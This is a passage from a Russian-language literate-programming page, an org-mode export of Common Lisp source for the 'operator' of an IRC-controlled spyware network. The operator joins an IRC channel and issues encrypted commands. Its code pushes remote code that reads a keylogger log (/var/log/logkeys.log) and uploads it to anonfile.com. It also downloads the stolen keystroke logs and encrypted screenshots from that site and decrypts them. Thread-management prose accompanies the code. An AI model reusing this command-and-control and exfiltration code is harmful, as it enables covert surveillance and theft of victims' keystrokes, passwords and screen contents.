      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; decrypt
(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))

;; unpack_img
(defun unpack-img (image)
  (declare (optimize (speed 3) (safety 0)))
  (let* ((dims (array-dimensions image))
         (height (car dims))
         (width (cadr dims))
         (new-width (ash width 3))
         (result (make-array (list height new-width)
                             :element-type '(unsigned-byte 8))))
    (declare (type fixnum width)
             (type fixnum new-width)
             (type fixnum height))
    (do ((qy 0 (incf qy)))
        ((= qy height))
      (declare (type fixnum qy))
      (do ((qx 0 (incf qx)))
          ((= qx width))
        (declare (type fixnum qx))
        (let ((acc (aref image qy qx)))
          (declare (type (unsigned-byte 8) acc))
          ;; (format t "~8,'0B" acc)
          (do ((out 0 (incf out))
               (in  7 (decf in)))
              ((= 8 out))
            (declare (type fixnum out in))
            (unless (= 0 (logand acc (ash 1 in)))
              (setf (aref result qy (logior (ash qx 3) out))
                    255)))))
      ;; (format t "~%")
      )
    result))

;; TEST
;; (print
;;  (unpack-img
;;   (pack-img
;;    (x-snapshot :width 31 :height 23))))

;; TEST
;; (time
;;  (let* ((image  (load-png "FILE1088"))
;;         (unpack (unpack-img image))
;;         (dims (array-dimensions unpack)))
;;    (save-png (cadr dims)
;;              (car dims)
;;              (format nil "~A" (gensym "FILE"))
;;              unpack
;;              :grayscale)))

(defun shot-downloader (str src)
  (let* ((key (parse-integer (subseq src 1)))
         (enc (anon-file-download str))
         (dec (decrypt enc key))
         (png (let ((png-read::*png-file* "fake-file"))
                (flex:with-input-from-sequence (stream dec)
                  (png-read:read-png-datastream stream))))
         (image-data (png-read:image-data png))
         ;; reverse
         (dims   (subseq (array-dimensions image-data) 0 2))
         (height (cadr dims))
         (width  (car  dims))
         (image ;; меняем размерности X и Y местами
          (let ((result (make-array (list height width)
                                    :element-type '(unsigned-byte 8))))
            (do ((y 0 (incf y)))
                ((= y height))
              (do ((x 0 (incf x)))
                  ((= x width))
                (setf (aref result y x)
                      (aref image-data x y))))
            result))
         ;; (dif (ppcre:scan-to-strings "/(.*)/([0-9]*)_([0-9]*)" str))
         ;; (img (if (not dif)
         ;;          (setf prev image)
         ;;          ;; else
         ;;          (setf prev (get-img-diff dims prev image))))
         (img image)
         ;; unpacking
         (unpack (unpack-img img))
         (unpack-dims (array-dimensions unpack))
         (new-width (cadr unpack-dims))
         (fname-str (multiple-value-bind (match-p result)
                        (ppcre:scan-to-strings "/.*/(.*)" str)
                      (elt result 0))))
    (let* ((png (make-instance 'zpng:png
                               :width new-width
                               :height height
                               :color-type :grayscale))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height new-width (zpng:samples-per-pixel png))
                    :displaced-to unpack :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
      (zpng:write-png png (format nil "~~/wnt/~A" fname-str)))
    t))

(defun task ()
  (destructuring-bind (str src)
      (task-data *current-task*)
    ;; (dbg ":: TF (~A): ~A: ~A~%" (length-of-queue) src str)
    (shot-downloader str src)))

(defparameter *operator*
  (lambda ()
    (let ((all-threads (mapcar #'(lambda (th)  (cons (bt:thread-name th) th))
                               (bt:all-threads))))
      (labels ((fnd (name) (loop :for (nm . th) :in all-threads
                              :do (when (equal name nm)  (return th))))
               (kill (th)  (handler-case (bt:destroy-thread th)
                             ;; happens, when thread destroyed already
                             (TYPE-ERROR () nil)
                             (SB-THREAD:INTERRUPT-THREAD-ERROR () nil)))
               (kill-op-irc (th)
                 (kill th)
                 (setf *watchdog-timer* 0)
                 (setf *op-connection-established-flag* nil))
               (clear ()
                 (bt:with-recursive-lock-held (*thread-operations-lock*)
                   (setf *task-threads*
                         (remove-if-not #'(lambda (pair)
                                            (bt:thread-alive-p (car pair)))
                                        *task-threads*)))))
        ;; if there is no irs-thread then start it
        (when (and (null (fnd "op-irc-th"))       ;; no op-irc-th
                   (null *op-irc-th-stop-flag*))  ;; no op-irc-th stop flag
          (dbg ":: operator lambda: start irc-th~%")
          (setf *watchdog-timer* 0)
          (bt:make-thread
           #'op-irc :name "op-irc-th"
           :initial-bindings
           `((*standard-output* . ,*standard-output*)
             (*op-irc-thread-stop-flag* . ,*op-irc-th-stop-flag*))))
        ;; if there is irc-thread, but the watchdog-timer exceeds
        ;; or the flag is set - then kill it.
        (awhen (fnd "op-irc-th")
          (when (&gt; *watchdog-timer*  *watchdog-timer-max*)
            (dbg ":: operator-lambda: kill op-irc-th by WDG~%")
            (kill-op-irc it))
          (when *op-irc-th-stop-flag*
            (dbg ":: operator-lambda: kill op-irc-th by FLAG~%")
            (kill-op-irc it)))
        (when (&gt; (length *task-threads*) *max-task-thread-cnt*)
          (dbg ":: operator-lambda: many task threads~%")
          (loop :for (task-th . time) :in *task-threads* :do
               (dbg ":: operator-lambda-killer ~A . ~A~%" task-th time)
               (when (&gt; (- (get-universal-time) time)
                        *max-task-thread-life-time*)
                 (dbg ":: operator-lambda: kill task-th by lifetime exceed~%")
                 (kill task-th)))
          (clear))
        (when (&lt; 0 (length-of-queue))
          (let* ((current-task (pop-task))
                 (bindings `((*standard-output* . ,*standard-output*)
                             (*task-thread-stop-flag* . ,*task-th-stop-flag*)
                             (*current-task* . ,current-task)
                             (*op-sess* . ,*op-sess*)
                             (*op-user* . ,*op-user*)
                             (*op-serv* . ,*op-serv*)
                             (*op-chan* . ,*op-chan*)
                             (*op-lock* . ,*op-lock*)
                             (*op-conn* . ,*op-conn*)
                             (*watchdog-timer* . ,*watchdog-timer*))))
            (bt:with-recursive-lock-held (*thread-operations-lock*)
              (push (cons (bt:make-thread #'task :name "task-th"
                                          :initial-bindings bindings)
                          (get-universal-time))
                    *task-threads*))))
        ))))

(defun operator-loop ()
  (setf *watchdog-timer* 0)
  (tagbody
   infinite
     (when *operator-stop-flag*
       (go end))
     (dbg "~%:: operator-loop WGD=~3,'OD~%" *watchdog-timer*)
     (funcall *operator*)
     (sleep *sleep-interval*)
     (incf *watchdog-timer*)
     (go infinite)
   end))

(operator-loop)
</pre>
</div>
</div>

<div id="outline-container-org00601a2" class="outline-3">
<h3 id="org00601a2">Operator</h3>
<div class="outline-text-3" id="text-org00601a2">
<p>
Оператор работает с потоками <code>op-irc-th</code>, задача которых - обрабатывать
сообщения, которые приходят из IRC-канала. Эти потоки могут зависнуть
попав в необработанную ошибку или при сбое сети, поэтому оператор должен
минимизировать ущерб от таких зависаний. В норме мы считаем, что должен
работать один поток <code>op-irc-th</code>.
</p>

<p>
Вторая задача оператора - осуществлять управление потоками, которые
выполняют задачи. Эти задачи возникают, когда из IRC-канала приходят
сообщения. В общем случае в для обработки каждого сообщения может
создаваться свой поток, при этом в силу (возможно) нестабильной работы
сети, часть из этих потоков может зависать. Это не должно сказываться на
роботоспособности всей программы.
</p>

<p>
Оператору для работы потребуются вспомогательные функции, которые:
</p>
<ul class="org-ul">
<li>ищут потоки по их именам</li>
<li>завершают поток</li>
<li>очищают список потоков от тех, что уже завершены</li>
</ul>

<p>
Поэтому мы можем определить рамочную функцию здесь, а куски кода, которые
выполняют логику работы с разными типами потоков доопределить ниже в этом
же разделе.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org8572cdc">(defparameter *watchdog-timer-max* 100)

(defparameter *task-th-stop-flag* nil)

(defparameter *op-irc-th-stop-flag* nil)

(defparameter *op-connection-established-flag* nil)

(defparameter *op-irc-threads* nil)

(defparameter *max-task-thread-cnt* 30)

(defparameter *task-threads* nil)

(defparameter *max-task-thread-life-time* 5)

(defparameter *thread-operations-lock*
  (bt:make-recursive-lock "thread-operations-lock"))

(defstruct task
  class
  data
  code)
(defparameter *task-queue* nil)
(defparameter *task-queue-lock* (bt:make-lock "task-queue-lock"))
(defun ins-task (task)
  (bt:with-lock-held (*task-queue-lock*)
    (setf *task-queue*
          (append *task-queue*
                  (list task)))))

(defun pop-task ()
  (bt:with-lock-held (*task-queue-lock*)
    (pop *task-queue*)))

(defun length-of-queue ()
  (bt:with-lock-held (*task-queue-lock*)
    (length *task-queue*)))

(defparameter *op-sess* nil)
(defparameter *op-user* nil)
(defparameter *op-serv* "irc.freenode.org")
(defparameter *op-chan* "#wntriscoming")
(defparameter *op-lock* (bt:make-recursive-lock "op-lock"))
(defparameter *op-conn* nil)

(defmacro sendmsg (msg &amp;rest params)
  `(bt:with-recursive-lock-held (*op-lock*)
     (cl-irc:privmsg *op-conn* *op-chan* (format nil ,msg ,@params))))

;; op-hook
;; op_cmd_proc
(defun shot-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))

(defun shot-rule-consequent (str src)
  (dbg ":: shot-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (ins-task (make-task :class 'task
                       :data (list str src)
                       :code #'identity)))

;; (shot-rule-consequent "/pe3bM7E9n5/3785062633" "b3785062627")
(defun hi-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^hi$" str))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; encrypt
(defun encrypt (oct seed)
  (let* ((len (length oct))
         (gen (prbs:byte-gen 31 :seed seed))
         (gam (funcall gen len))
         (enc (seq-xor len oct gam)))
    (base64:usb8-array-to-base64-string enc)))

;; anon_file_upload
;; (setf drakma:*header-stream* *standard-output*)

(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-csrf (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings "(?m)app_csrf_token\\s+=\\s+\"(.*)\";" str)
           (when match-p (return (aref result 0))))))

(defun get-cookies-alist (cookie-jar)
  "Получаем alist с печеньками из cookie-jar"
  (loop :for cookie :in (drakma:cookie-jar-cookies cookie-jar) :append
       (list (cons (drakma:cookie-name cookie) (drakma:cookie-value cookie)))))

(defun anon-file-upload (filename content)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request "https://anonfile.com/"
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (csrf (get-csrf text))
             (boundary "---------------------------196955623314664815241571979859")
             (type-header (format nil "multipart/form-data; boundary=~A" boundary))
             (new-headers `(("Accept" . "application/json")
                            ("Accept-Language" . "en-US,en;q=0.5")
                            ("Cache-Control" . "no-cache")
                            ("X-Requested-With" . "XMLHttpRequest")
                            ("X-CSRF-Token" . ,csrf)
                            ("Origin" . "https://anonfile.com")
                            ("Referer" . "https://anonfile.com/")
                            ("Content-Type" . ,type-header)
                            ("TE" . "Trailers"))))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request
             "https://api.anonfile.com/upload"
             :user-agent *user-agent*
             :method :post
             :form-data t
             :content (format nil "--~A
Content-Disposition: form-data; name=\"file\"; filename=\"~A\"
Content-Type: application/octet-stream

~A
--~A--" boundary filename content boundary)
             :cookie-jar cookie-jar
             :additional-headers new-headers
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; upload_code
(defun upload-code (code key)
  (let* ((oct (flex:string-to-octets code :external-format :utf-8))
         (base64 (encrypt oct key))
         (filename (format nil "u-~A" (get-universal-time)))
         (result   (cl-json:decode-json-from-string
                    (anon-file-upload filename base64)))
         (link     (if (cdr (assoc :status result))
                       (subseq (cdadr (cadadr (assoc :data result))) 20)
                       nil)))
    link))

;; TEST for upload
;; (upload-code "(defun alfa () (print 1))" 1234567890)
;; /t1TaCeD1ne/u-3784605289

;; encode
(defun encode (cmd seed)
  (let* ((oct     (flex:string-to-octets cmd :external-format :utf-8))
         (crc32   (ironclad:byte-array-to-hex-string
                   (ironclad:digest-sequence :crc32 oct)))
         (encoded (encrypt oct seed)))
    (format nil "s/~A/~A" crc32 encoded)))

(defun upload-code-and-send (code key seed)
  (let* ((code-link (upload-code code key))
         (cmd (format nil "(update \"~A\" ~A)" code-link key))
         (enc (encode cmd seed)))
    (sendmsg enc)))

;; (upload-code-and-send "(alfa)" 1234567890 3784753813)

(defun hi-rule-consequent (str src)
  (dbg ":: HI-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890)
         (receiver (parse-integer (subseq src 1)))
         (code (format
                nil
                "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
                tmpkey)))
    (upload-code-and-send code tmpkey receiver)))

;; (let* ((tmpkey 1234567890)
;;        (src "b3785294860")
;;        (receiver (parse-integer (subseq src 1)))
;;        (code (format
;;               nil
;;               "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
;;               tmpkey)))
;;   (upload-code-and-send code tmpkey receiver))
(defun k-rule-antecedent (str src)
  (declare (ignore src))
  (ppcre:scan-to-strings "^k/(.*)/u-(.*)$" str))

(defun download-and-decrypt (link key)
  (flex:octets-to-string
   (decrypt
    (anon-file-download link)
    key)
   :external-format :utf-8))

;; (upload-code
;;  (alexandria:read-file-into-string "q.lisp\"")

;; (download-and-decrypt "/some/link" *tmpkey*)

(defun k-rule-consequent (str src)
  (dbg ":: K-rule-consequent (~A) ~A: ~A~%"
       (length-of-queue) src str)
  (let* ((tmpkey 1234567890))
    (alexandria:write-string-into-file
     (download-and-decrypt (subseq str 1) tmpkey)
     (format nil "~~/wnt/~A.log" (ppcre:regex-replace-all "/" str "_")))))

(defparameter *op-rules*
  (list (cons #'shot-rule-antecedent  #'shot-rule-consequent)
        (cons #'hi-rule-antecedent    #'hi-rule-consequent)
        (cons #'k-rule-antecedent     #'k-rule-consequent)))

(defparameter *op-cmd*
  (lambda (param)
    (block op-cmd-block
      (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
             (src  (CL-IRC:SOURCE param))
             ;; (oct  (decrypt msg *op-sess*))
             ;; (str  (handler-case
             ;;           (flex:octets-to-string oct :external-format :utf-8)
             ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
             (str msg)
             )
        (dbg ":: op-cmd ~A: ~A~%" src str)
        (block op-rules-dispatcher
          (let ((applyed_rules 0))
            (loop :for (antecedent . consequent) :in *op-rules* :do
                 (when (funcall antecedent str src)
                   (incf applyed_rules)
                   (dbg ":: op-cmd rule: ~A~%" consequent)
                   (when (funcall consequent str src)
                     (return-from op-rules-dispatcher nil))))
            (when (&gt; 0 applyed_rules)
              (dbg "::UNKMSG [~A] from [~A]~%" str src))
            (finish-output)))
        ))))

(defun op-msg-hook (param)
  "MUST return T for stop hooks processing"
  (funcall *op-cmd* param)
  t)

(defun op-helper ()
  (sleep 1)
  (cl-irc:add-hook *op-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'op-msg-hook)
  (sleep 1)
  (bt:with-recursive-lock-held (*op-lock*)
    (cl-irc:join *op-conn* *op-chan*))
  (sleep 1)
  (bt:with-recursive-lock-held (*op-lock*)
    (setf *op-connection-established-flag* t))
  (sendmsg "op here"))

(defun op-loop ()
  (bt:make-thread
   #'op-helper :name "op-helper-th"
   :initial-bindings
   `((*standard-output* . ,*standard-output*)
     (*op-sess* . ,*op-sess*)
     (*op-user* . ,*op-user*)
     (*op-serv* . ,*op-serv*)
     (*op-chan* . ,*op-chan*)
     (*op-lock* . ,*op-lock*)
     (*op-conn* . ,*op-conn*)))
  (handler-case (cl-irc:read-message-loop *op-conn*)
    (SB-INT:SIMPLE-STREAM-ERROR (err)
      (dbg ":: op-loop error: ~A~%" (type-of err)))
    ;; (t (err)
    ;;   (dbg "::op-loop error: ~A~%" (type-of err)))
    ))

(defun op-irc ()
  "operator's irc thread func"
  (setf *op-sess* (get-universal-time))
  (setf *op-user* (format nil "op~A" *op-sess*))
  (setf *op-conn*
        (handler-case
            (cl-irc:connect :nickname *op-user* :server *op-serv*)
          (USOCKET:NS-TRY-AGAIN-CONDITION (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)
          (t (err)
            (dbg "::irc connect error: ~A~%" (type-of err))
            nil)))
  (when *op-conn*
    (dbg "::op irc conn:~A~%" *op-conn*)
    (setf *watchdog-timer* 0)
    (op-loop)))

;; anon_file_download
(defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

(defparameter *additional-headers*
  `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
    ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
    ("Accept-Charset" . "utf-8")))

(defun get-download-link (text)
  (loop :for str :in (split-sequence:split-sequence #\Newline text)
     :do (multiple-value-bind (match-p result)
             (ppcre:scan-to-strings
              "(https://cdn-([0-9]*)\.anonfile.com\/(.*))\\\""
              str)
           (when match-p (return (aref result 0))))))

(defun anon-file-download (filename)
  (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
    ;; load mainpage for cookies, headers and csrf
    (multiple-value-bind (body-or-stream ;; status-code headers uri
                          ;;stream must-close reason-phrase
                          )
        (drakma:http-request (format nil "https://anonfile.com~A" filename)
                             :user-agent *user-agent*
                             :redirect 10
                             :force-binary t
                             :cookie-jar cookie-jar
                             :additional-headers *additional-headers*)
      (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
             (link (get-download-link text)))
        (multiple-value-bind (body-or-stream ;; status-code headers uri
                              ;;stream must-close reason-phrase
                              )
            (drakma:http-request link
             :user-agent *user-agent*
             :cookie-jar cookie-jar
             :additional-headers *additional-headers*
             :force-binary t)
          (flex:octets-to-string body-or-stream :external-format :utf-8))))))

;; seq_xor
(defun seq-xor (len seq-1 seq-2)
  (let ((result (make-array len :element-type '(unsigned-byte 8))))
    (do ((idx 0 (incf idx)))
        ((= idx len))
      (setf (aref result idx)
            (logxor (aref seq-1 idx)
                    (aref seq-2 idx))))
    result))

;; decrypt
(defun decrypt (base64 seed)
  (let* ((oct (base64:base64-string-to-usb8-array base64))
         (gen (prbs:byte-gen 31 :seed seed))
         (len (length oct))
         (gam (funcall gen len)))
    (seq-xor len oct gam)))

;; unpack_img
(defun unpack-img (image)
  (declare (optimize (speed 3) (safety 0)))
  (let* ((dims (array-dimensions image))
         (height (car dims))
         (width (cadr dims))
         (new-width (ash width 3))
         (result (make-array (list height new-width)
                             :element-type '(unsigned-byte 8))))
    (declare (type fixnum width)
             (type fixnum new-width)
             (type fixnum height))
    (do ((qy 0 (incf qy)))
        ((= qy height))
      (declare (type fixnum qy))
      (do ((qx 0 (incf qx)))
          ((= qx width))
        (declare (type fixnum qx))
        (let ((acc (aref image qy qx)))
          (declare (type (unsigned-byte 8) acc))
          ;; (format t "~8,'0B" acc)
          (do ((out 0 (incf out))
               (in  7 (decf in)))
              ((= 8 out))
            (declare (type fixnum out in))
            (unless (= 0 (logand acc (ash 1 in)))
              (setf (aref result qy (logior (ash qx 3) out))
                    255)))))
      ;; (format t "~%")
      )
    result))

;; TEST
;; (print
;;  (unpack-img
;;   (pack-img
;;    (x-snapshot :width 31 :height 23))))

;; TEST
;; (time
;;  (let* ((image  (load-png "FILE1088"))
;;         (unpack (unpack-img image))
;;         (dims (array-dimensions unpack)))
;;    (save-png (cadr dims)
;;              (car dims)
;;              (format nil "~A" (gensym "FILE"))
;;              unpack
;;              :grayscale)))

(defun shot-downloader (str src)
  (let* ((key (parse-integer (subseq src 1)))
         (enc (anon-file-download str))
         (dec (decrypt enc key))
         (png (let ((png-read::*png-file* "fake-file"))
                (flex:with-input-from-sequence (stream dec)
                  (png-read:read-png-datastream stream))))
         (image-data (png-read:image-data png))
         ;; reverse
         (dims   (subseq (array-dimensions image-data) 0 2))
         (height (cadr dims))
         (width  (car  dims))
         (image ;; меняем размерности X и Y местами
          (let ((result (make-array (list height width)
                                    :element-type '(unsigned-byte 8))))
            (do ((y 0 (incf y)))
                ((= y height))
              (do ((x 0 (incf x)))
                  ((= x width))
                (setf (aref result y x)
                      (aref image-data x y))))
            result))
         ;; (dif (ppcre:scan-to-strings "/(.*)/([0-9]*)_([0-9]*)" str))
         ;; (img (if (not dif)
         ;;          (setf prev image)
         ;;          ;; else
         ;;          (setf prev (get-img-diff dims prev image))))
         (img image)
         ;; unpacking
         (unpack (unpack-img img))
         (unpack-dims (array-dimensions unpack))
         (new-width (cadr unpack-dims))
         (fname-str (multiple-value-bind (match-p result)
                        (ppcre:scan-to-strings "/.*/(.*)" str)
                      (elt result 0))))
    (let* ((png (make-instance 'zpng:png
                               :width new-width
                               :height height
                               :color-type :grayscale))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height new-width (zpng:samples-per-pixel png))
                    :displaced-to unpack :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
      (zpng:write-png png (format nil "~~/wnt/~A" fname-str)))
    t))

(defun task ()
  (destructuring-bind (str src)
      (task-data *current-task*)
    ;; (dbg ":: TF (~A): ~A: ~A~%" (length-of-queue) src str)
    (shot-downloader str src)))

(defparameter *operator*
  (lambda ()
    (let ((all-threads (mapcar #'(lambda (th)  (cons (bt:thread-name th) th))
                               (bt:all-threads))))
      (labels ((fnd (name) (loop :for (nm . th) :in all-threads
                              :do (when (equal name nm)  (return th))))
               (kill (th)  (handler-case (bt:destroy-thread th)
                             ;; happens, when thread destroyed already
                             (TYPE-ERROR () nil)
                             (SB-THREAD:INTERRUPT-THREAD-ERROR () nil)))
               (kill-op-irc (th)
                 (kill th)
                 (setf *watchdog-timer* 0)
                 (setf *op-connection-established-flag* nil))
               (clear ()
                 (bt:with-recursive-lock-held (*thread-operations-lock*)
                   (setf *task-threads*
                         (remove-if-not #'(lambda (pair)
                                            (bt:thread-alive-p (car pair)))
                                        *task-threads*)))))
        ;; if there is no irs-thread then start it
        (when (and (null (fnd "op-irc-th"))       ;; no op-irc-th
                   (null *op-irc-th-stop-flag*))  ;; no op-irc-th stop flag
          (dbg ":: operator lambda: start irc-th~%")
          (setf *watchdog-timer* 0)
          (bt:make-thread
           #'op-irc :name "op-irc-th"
           :initial-bindings
           `((*standard-output* . ,*standard-output*)
             (*op-irc-thread-stop-flag* . ,*op-irc-th-stop-flag*))))
        ;; if there is irc-thread, but the watchdog-timer exceeds
        ;; or the flag is set - then kill it.
        (awhen (fnd "op-irc-th")
          (when (&gt; *watchdog-timer*  *watchdog-timer-max*)
            (dbg ":: operator-lambda: kill op-irc-th by WDG~%")
            (kill-op-irc it))
          (when *op-irc-th-stop-flag*
            (dbg ":: operator-lambda: kill op-irc-th by FLAG~%")
            (kill-op-irc it)))
        (when (&gt; (length *task-threads*) *max-task-thread-cnt*)
          (dbg ":: operator-lambda: many task threads~%")
          (loop :for (task-th . time) :in *task-threads* :do
               (dbg ":: operator-lambda-killer ~A . ~A~%" task-th time)
               (when (&gt; (- (get-universal-time) time)
                        *max-task-thread-life-time*)
                 (dbg ":: operator-lambda: kill task-th by lifetime exceed~%")
                 (kill task-th)))
          (clear))
        (when (&lt; 0 (length-of-queue))
          (let* ((current-task (pop-task))
                 (bindings `((*standard-output* . ,*standard-output*)
                             (*task-thread-stop-flag* . ,*task-th-stop-flag*)
                             (*current-task* . ,current-task)
                             (*op-sess* . ,*op-sess*)
                             (*op-user* . ,*op-user*)
                             (*op-serv* . ,*op-serv*)
                             (*op-chan* . ,*op-chan*)
                             (*op-lock* . ,*op-lock*)
                             (*op-conn* . ,*op-conn*)
                             (*watchdog-timer* . ,*watchdog-timer*))))
            (bt:with-recursive-lock-held (*thread-operations-lock*)
              (push (cons (bt:make-thread #'task :name "task-th"
                                          :initial-bindings bindings)
                          (get-universal-time))
                    *task-threads*))))
        ))))
</pre>
</div>
</div>

<div id="outline-container-orgc5b63bd" class="outline-4">
<h4 id="orgc5b63bd">op-irc-th management</h4>
<div class="outline-text-4" id="text-orgc5b63bd">
<p>
Если отсутствуют потоки <code>op-irc-th</code> оператор будет пытаться создать один,
и реинициализировать <code>watchdog-timer</code>.
</p>

<p>
Если хотя бы один поток <code>op-irc-th</code> существует, но значение
<code>watchdog-timer</code> слишком велико - он будет убит, потому что, вероятно, он
завис. Ведь независший поток сбрасывал бы <code>watchdog-timer</code> каждый раз
выполняя какую-либо операцию, например, получая сообщение.
</p>

<p>
Если значение <code>watchdog-timer</code> продолжает оставаться слишком большим,
т.е. никакой из зависший потоков не подал признаки жизни, то при
следующем запуске <code>operator</code> будет убит следующий поток.
</p>

<p>
И так далее, пока потоков <code>op-irc-th</code> не останется (или один из оживших
потоков <code>op-irc-th</code> не обнулит таймер - например при приходе
сообщения).
</p>

<p>
Когда все потоки будут уничтожены оператор будет пытаться создавать
новые, сводя задачу к известной.
</p>

<p>
Так мы обеспечиваем попытки перезапуска, уничтожая все потоки когда
<code>watchdog-timer</code> перестает обновляться и избегая ситуации, когда в канале
одновременно больше одного независшего потока.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org47c0167">;; if there is no irs-thread then start it
(when (and (null (fnd "op-irc-th"))       ;; no op-irc-th
           (null *op-irc-th-stop-flag*))  ;; no op-irc-th stop flag
  (dbg ":: operator lambda: start irc-th~%")
  (setf *watchdog-timer* 0)
  (bt:make-thread
   #'op-irc :name "op-irc-th"
   :initial-bindings
   `((*standard-output* . ,*standard-output*)
     (*op-irc-thread-stop-flag* . ,*op-irc-th-stop-flag*))))
;; if there is irc-thread, but the watchdog-timer exceeds
;; or the flag is set - then kill it.
(awhen (fnd "op-irc-th")
  (when (&gt; *watchdog-timer*  *watchdog-timer-max*)
    (dbg ":: operator-lambda: kill op-irc-th by WDG~%")
    (kill-op-irc it))
  (when *op-irc-th-stop-flag*
    (dbg ":: operator-lambda: kill op-irc-th by FLAG~%")
    (kill-op-irc it)))
</pre>
</div>
</div>
</div>

<div id="outline-container-org9ea9ba9" class="outline-4">
<h4 id="org9ea9ba9">Task's threads management</h4>
<div class="outline-text-4" id="text-org9ea9ba9">
<p>
Мы получаем задачи из очереди, которая будет определена в одном из
разделов ниже. В первую очередь, необходимо следить, чтобы количество
рабочих потоков не было слишком большим, убивая потоки, которые дольше
всех работают. Мы считаем, что никакой поток не должен работать более
<code>max-task-thread-life-time</code> секунд. Если он работает дольше - мы можем
это позволить только если система не перегружена, т.е. общее количество
потоков меньше <code>max-task-thread-cnt</code>.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org4457ba2">(when (&gt; (length *task-threads*) *max-task-thread-cnt*)
  (dbg ":: operator-lambda: many task threads~%")
  (loop :for (task-th . time) :in *task-threads* :do
       (dbg ":: operator-lambda-killer ~A . ~A~%" task-th time)
       (when (&gt; (- (get-universal-time) time)
                *max-task-thread-life-time*)
         (dbg ":: operator-lambda: kill task-th by lifetime exceed~%")
         (kill task-th)))
  (clear))
</pre>
</div>

<p>
Кроме того, по идее, необходимо следить, [TODO:gmm] чтобы очередь не
переполнялась, но я пока не решил, как именно лучше делать - прекратить
ли принимать новые задачи или удалять старые: по идее все приходящие
задачи для нас одинаково важны.
</p>

<p>
Переходим к выполнению задач.
</p>

<p>
Если очередь не пуста, то было бы неплохо вынуть из нее несколько задач и
для каждой из них запустить поток. [TODO:gmm] Но пока я запускаю по одной
задаче на итерацию.
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org26ae78f">(when (&lt; 0 (length-of-queue))
  (let* ((current-task (pop-task))
         (bindings `((*standard-output* . ,*standard-output*)
                     (*task-thread-stop-flag* . ,*task-th-stop-flag*)
                     (*current-task* . ,current-task)
                     (*op-sess* . ,*op-sess*)
                     (*op-user* . ,*op-user*)
                     (*op-serv* . ,*op-serv*)
                     (*op-chan* . ,*op-chan*)
                     (*op-lock* . ,*op-lock*)
                     (*op-conn* . ,*op-conn*)
                     (*watchdog-timer* . ,*watchdog-timer*))))
    (bt:with-recursive-lock-held (*thread-operations-lock*)
      (push (cons (bt:make-thread #'task :name "task-th"
                                  :initial-bindings bindings)
                  (get-universal-time))
            *task-threads*))))
</pre>
</div>

<p>
Собственно функция <code>TASK</code>, которая выполняет задачу, будет описана в
соответствуюшщем разделе.
</p>

<p>
Собираем все вместе:
</p>

<div class="org-src-container">
<pre class="src src-lisp" id="org42cd639">(when (&gt; (length *task-threads*) *max-task-thread-cnt*)
  (dbg ":: operator-lambda: many task threads~%")
